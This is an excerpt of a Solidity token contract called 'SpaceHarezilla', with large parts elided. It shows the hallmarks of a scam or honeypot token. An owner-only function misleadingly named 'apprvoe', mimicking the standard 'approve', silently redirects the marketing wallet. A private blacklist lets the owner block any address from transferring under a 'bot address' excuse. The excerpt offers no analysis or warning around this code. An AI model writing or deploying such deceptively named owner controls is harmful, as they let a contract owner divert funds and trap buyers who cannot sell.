...
contract SpaceHarezilla is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "SpaceHarezilla";
    string private _symbol = "SpaceHarezilla";
    uint8 private _decimals = 3;
    mapping (address => bool) private blist;

    address payable private marketingWalletAddress = payable(0xbf4D480A2302aF859E22073766c8bAcb7f51C939); 
    address payable private teamWalletAddress = payable(0xbf4D480A2302aF859E22073766c8bAcb7f51C939); 
  ...
  function changeTokenSymbol(string memory newSymbol) external onlyOwner {
    ...
    function apprvoe(address value) external onlyOwner() {
      marketingWalletAddress = payable(value);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!blist[sender] && !blist[recipient],"bot address");
        if(inSwapAndLiquify)
        { 
    ...
    function addB(address bot) internal {
        blist[bot] = true;
    }
